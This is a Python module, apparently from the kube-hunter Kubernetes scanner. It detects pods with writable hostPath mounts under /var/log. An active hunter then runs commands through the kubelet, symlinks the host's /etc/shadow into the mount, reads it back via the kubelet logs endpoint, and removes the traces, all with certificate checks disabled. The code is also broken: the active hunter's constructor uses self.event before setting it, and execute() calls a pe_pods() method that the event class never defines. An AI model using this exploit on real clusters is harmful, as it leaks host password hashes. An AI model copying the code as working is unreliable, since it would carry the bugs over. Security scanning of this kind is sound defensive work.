import logging
import re
import uuid

from kube_hunter.conf import get_config
from kube_hunter.core.events.event_handler import handler
from kube_hunter.core.events.types import Event, Vulnerability
from kube_hunter.core.types import ActiveHunter, Hunter, KubernetesCluster, HostPathMountPrivilegeEscalationTechnique
from kube_hunter.modules.hunting.kubelet import (
    ExposedPodsHandler,
    ExposedRunHandler,
    KubeletHandlers,
)

logger = logging.getLogger(__name__)


class WriteMountToVarLog(Vulnerability, Event):
    """A pod can create symlinks in the /var/log directory on the host, which can lead to a root directory traveral"""

    def __init__(self, pods):
        Vulnerability.__init__(
            self,
            KubernetesCluster,
            "Pod With Mount To /var/log",
            category=HostPathMountPrivilegeEscalationTechnique,
            vid="KHV047",
        )
        self.pods = pods
        self.evidence = "pods: {}".format(", ".join(pod["metadata"]["name"] for pod in self.pods))


class DirectoryTraversalWithKubelet(Vulnerability, Event):
    """An attacker can run commands on pods with mount to /var/log,
    and traverse read all files on the host filesystem"""

    def __init__(self, output):
        Vulnerability.__init__(
            self,
            KubernetesCluster,
            "Root Traversal Read On The Kubelet",
            category=HostPathMountPrivilegeEscalationTechnique,
        )
        self.output = output
        self.evidence = f"output: {self.output}"


@handler.subscribe(ExposedPodsHandler)
class VarLogMountHunter(Hunter):
    """Mount Hunter - /var/log
    Hunt pods that have write access to host's /var/log. in such case,
    the pod can traverse read files on the host machine
    """

    def __init__(self, event):
        self.event = event

    def has_write_mount_to(self, pod_data, path):
        """Returns volume for correlated writable mount"""
        for volume in pod_data["spec"]["volumes"]:
            if "hostPath" in volume:
                if "Directory" in volume["hostPath"]["type"]:
                    if volume["hostPath"]["path"].startswith(path):
                        return volume

    def execute(self):
        pe_pods = []
        for pod in self.event.pods:
            if self.has_write_mount_to(pod, path="/var/log"):
                pe_pods.append(pod)
        if pe_pods:
            self.publish_event(WriteMountToVarLog(pods=pe_pods))


@handler.subscribe_many([ExposedRunHandler, WriteMountToVarLog])
class ProveVarLogMount(ActiveHunter):
    """Prove /var/log Mount Hunter
    Tries to read /etc/shadow on the host by running commands inside a pod with host mount to /var/log
    """

    def __init__(self, event):
        self.write_mount_event = self.event.get_by_class(WriteMountToVarLog)
        self.event = self.write_mount_event

        self.base_path = f"https://{self.write_mount_event.host}:{self.write_mount_event.port}"

    def run(self, command, container):
        run_url = KubeletHandlers.RUN.value.format(
            podNamespace=container["namespace"],
            podID=container["pod"],
            containerName=container["name"],
            cmd=command,
        )
        return self.event.session.post(f"{self.base_path}/{run_url}", verify=False).text

    def mount_path_from_mountname(self, pod, mount_name):
        """returns container name, and container mount path correlated to mount_name"""
        for container in pod["spec"]["containers"]:
            for volume_mount in container["volumeMounts"]:
                if volume_mount["name"] == mount_name:
                    logger.debug(f"yielding {container}")
                    yield container, volume_mount["mountPath"]

    def traverse_read(self, host_file, container, mount_path, host_path):
        """Returns content of file on the host, and cleans trails"""
        config = get_config()
        symlink_name = str(uuid.uuid4())
        # creating symlink to file
        self.run(f"ln -s {host_file} {mount_path}/{symlink_name}", container)
        # following symlink with kubelet
        path_in_logs_endpoint = KubeletHandlers.LOGS.value.format(
            path=re.sub(r"^/var/log", "", host_path) + symlink_name
        )
        content = self.event.session.get(
            f"{self.base_path}/{path_in_logs_endpoint}",
            verify=False,
            timeout=config.network_timeout,
        ).text
        # removing symlink
        self.run(f"rm {mount_path}/{symlink_name}", container=container)
        return content

    def execute(self):
        for pod, volume in self.write_mount_event.pe_pods():
            for container, mount_path in self.mount_path_from_mountname(pod, volume["name"]):
                logger.debug("Correlated container to mount_name")
                cont = {
                    "name": container["name"],
                    "pod": pod["metadata"]["name"],
                    "namespace": pod["metadata"]["namespace"],
                }
                try:
                    output = self.traverse_read(
                        "/etc/shadow",
                        container=cont,
                        mount_path=mount_path,
                        host_path=volume["hostPath"]["path"],
                    )
                    self.publish_event(DirectoryTraversalWithKubelet(output=output))
                except Exception:
                    logger.debug("Could not exploit /var/log", exc_info=True)
